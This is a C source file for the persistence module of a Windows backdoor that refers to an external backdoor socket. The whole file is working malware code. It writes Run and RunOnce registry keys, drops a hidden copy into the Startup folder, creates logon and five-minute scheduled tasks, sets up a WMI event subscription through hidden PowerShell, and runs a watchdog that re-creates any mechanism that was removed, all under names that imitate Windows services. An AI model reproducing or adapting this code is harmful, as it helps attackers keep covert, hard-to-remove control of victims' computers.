#include "persistence.h"
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// External socket from backdoor.c
extern int sock;

// Disguised names that blend with legitimate Windows processes
static const char* DISGUISED_NAMES[] = {
    "RuntimeBroker",
    "SecurityHealthService",
    "WindowsUpdateAgent",
    "MicrosoftEdgeUpdate",
    "SearchIndexer",
    "WmiPrvSE"
};
#define NUM_DISGUISED_NAMES 6

// Registry paths for persistence
#define REG_RUN_HKCU "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_RUNONCE_HKCU "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
#define REG_RUN_HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

// Watchdog interval (5 minutes in milliseconds)
#define WATCHDOG_INTERVAL 300000

/**
 * Check if the current process is running with elevated (admin) privileges
 */
BOOL IsElevated()
{
    BOOL elevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
    {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size))
        {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    return elevated;
}

/**
 * Get a randomized disguise name from the pool
 */
const char* GetDisguisedName()
{
    static int seeded = 0;
    if (!seeded)
    {
        srand((unsigned)time(NULL) ^ GetCurrentProcessId());
        seeded = 1;
    }
    return DISGUISED_NAMES[rand() % NUM_DISGUISED_NAMES];
}

/**
 * Add persistence via multiple registry Run keys
 * Returns number of keys successfully added
 */
int PersistRegistry()
{
    char szPath[MAX_PATH];
    HKEY hKey;
    int success = 0;
    const char* valueName = GetDisguisedName();

    // Get current executable path
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        return 0;
    }

    // HKCU Run key (always - no admin needed)
    if (RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUN_HKCU, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1) == ERROR_SUCCESS)
        {
            success++;
        }
        RegCloseKey(hKey);
    }

    // HKCU RunOnce key (backup - runs once per login)
    if (RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUNONCE_HKCU, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        char runOnceValue[64];
        snprintf(runOnceValue, sizeof(runOnceValue), "%sService", valueName);

        if (RegSetValueEx(hKey, runOnceValue, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1) == ERROR_SUCCESS)
        {
            success++;
        }
        RegCloseKey(hKey);
    }

    // HKLM Run key (if running as admin - all users)
    if (IsElevated())
    {
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_RUN_HKLM, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
        {
            if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1) == ERROR_SUCCESS)
            {
                success++;
            }
            RegCloseKey(hKey);
        }
    }

    return success;
}

/**
 * Copy executable to Startup folder with disguised name
 * Returns 1 on success, 0 on failure
 */
int PersistStartupFolder()
{
    char startupPath[MAX_PATH];
    char srcPath[MAX_PATH];
    char destPath[MAX_PATH];
    const char* disguisedName = GetDisguisedName();

    // Get Startup folder path
    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK)
    {
        return 0;
    }

    // Get current executable path
    if (GetModuleFileName(NULL, srcPath, MAX_PATH) == 0)
    {
        return 0;
    }

    // Build destination path with disguised name
    snprintf(destPath, MAX_PATH, "%s\\%s.exe", startupPath, disguisedName);

    // Copy file (overwrite if exists)
    if (!CopyFile(srcPath, destPath, FALSE))
    {
        return 0;
    }

    // Set hidden + system attributes to reduce visibility
    SetFileAttributes(destPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return 1;
}

/**
 * Create scheduled tasks for persistence
 * Returns 1 on success, 0 on failure
 */
int PersistScheduledTask()
{
    char szPath[MAX_PATH];
    char cmd[1024];
    const char* taskName = GetDisguisedName();
    int success = 0;

    // Get current executable path
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        return 0;
    }

    // Delete existing task first (ignore errors)
    snprintf(cmd, sizeof(cmd),
        "schtasks /Delete /TN \"%s\" /F >nul 2>&1", taskName);
    system(cmd);

    // Create task with ONLOGON trigger (runs when any user logs in)
    snprintf(cmd, sizeof(cmd),
        "schtasks /Create /TN \"%s\" /TR \"\\\"%s\\\"\" /SC ONLOGON /RL HIGHEST /F >nul 2>&1",
        taskName, szPath);

    if (system(cmd) == 0)
    {
        success = 1;
    }

    // Create additional watchdog task (runs every 5 minutes)
    snprintf(cmd, sizeof(cmd),
        "schtasks /Delete /TN \"%sUpdate\" /F >nul 2>&1", taskName);
    system(cmd);

    snprintf(cmd, sizeof(cmd),
        "schtasks /Create /TN \"%sUpdate\" /TR \"\\\"%s\\\"\" /SC MINUTE /MO 5 /F >nul 2>&1",
        taskName, szPath);

    if (system(cmd) == 0)
    {
        success = 1;
    }

    return success;
}

/**
 * Create WMI event subscription for persistence
 * Returns 1 on success, 0 on failure
 */
int PersistWMI()
{
    char szPath[MAX_PATH];
    char cmd[4096];
    const char* name = GetDisguisedName();

    // Get current executable path
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        return 0;
    }

    // Escape backslashes for PowerShell
    char escapedPath[MAX_PATH * 2];
    int j = 0;
    for (int i = 0; szPath[i] != '\0' && j < (MAX_PATH * 2 - 2); i++)
    {
        if (szPath[i] == '\\')
        {
            escapedPath[j++] = '\\';
            escapedPath[j++] = '\\';
        }
        else
        {
            escapedPath[j++] = szPath[i];
        }
    }
    escapedPath[j] = '\0';

    // Create WMI event subscription via PowerShell
    // This creates a permanent event that triggers every 60 seconds
    snprintf(cmd, sizeof(cmd),
        "powershell -WindowStyle Hidden -Command \""
        "$filter = Set-WmiInstance -Namespace root\\\\subscription -Class __EventFilter "
        "-Arguments @{Name='%s'; EventNamespace='root\\\\cimv2'; "
        "QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'}; "
        "$consumer = Set-WmiInstance -Namespace root\\\\subscription -Class CommandLineEventConsumer "
        "-Arguments @{Name='%s'; CommandLineTemplate='%s'}; "
        "Set-WmiInstance -Namespace root\\\\subscription -Class __FilterToConsumerBinding "
        "-Arguments @{Filter=$filter; Consumer=$consumer}\" >nul 2>&1",
        name, name, escapedPath);

    return (system(cmd) == 0) ? 1 : 0;
}

/**
 * Execute all persistence mechanisms
 * Returns total number of successful mechanisms
 */
int PersistAll()
{
    int count = 0;

    count += PersistRegistry();
    count += PersistStartupFolder();
    count += PersistScheduledTask();
    count += PersistWMI();

    return count;
}

/**
 * Check if persistence mechanisms are active and repair missing ones
 * Returns number of repairs made
 */
int PersistCheck()
{
    char szPath[MAX_PATH];
    int repairs = 0;

    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        return 0;
    }

    // Check HKCU Run key
    HKEY hKey;
    BOOL regFound = FALSE;

    if (RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUN_HKCU, 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        char value[MAX_PATH];
        DWORD size;

        for (int i = 0; i < NUM_DISGUISED_NAMES && !regFound; i++)
        {
            size = MAX_PATH;
            if (RegQueryValueEx(hKey, DISGUISED_NAMES[i], NULL, NULL, (BYTE*)value, &size) == ERROR_SUCCESS)
            {
                regFound = TRUE;
            }
        }
        RegCloseKey(hKey);
    }

    if (!regFound)
    {
        PersistRegistry();
        repairs++;
    }

    // Check Startup folder
    char startupPath[MAX_PATH];
    BOOL startupFound = FALSE;

    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK)
    {
        for (int i = 0; i < NUM_DISGUISED_NAMES && !startupFound; i++)
        {
            char checkPath[MAX_PATH];
            snprintf(checkPath, MAX_PATH, "%s\\%s.exe", startupPath, DISGUISED_NAMES[i]);

            if (GetFileAttributes(checkPath) != INVALID_FILE_ATTRIBUTES)
            {
                startupFound = TRUE;
            }
        }
    }

    if (!startupFound)
    {
        PersistStartupFolder();
        repairs++;
    }

    return repairs;
}

/**
 * Watchdog thread function - runs in background checking persistence
 */
DWORD WINAPI WatchdogThread(LPVOID lpParam)
{
    // Create named mutex to prevent multiple watchdog instances
    HANDLE hMutex = CreateMutex(NULL, TRUE, "Global\\BlxdMoonWatchdog");

    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        // Another watchdog is already running
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    // Infinite loop - check and repair every 5 minutes
    while (1)
    {
        Sleep(WATCHDOG_INTERVAL);
        PersistCheck();
    }

    // Never reached, but good practice
    if (hMutex) CloseHandle(hMutex);
    return 0;
}

/**
 * Start the background watchdog thread
 */
void StartWatchdogThread()
{
    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
}
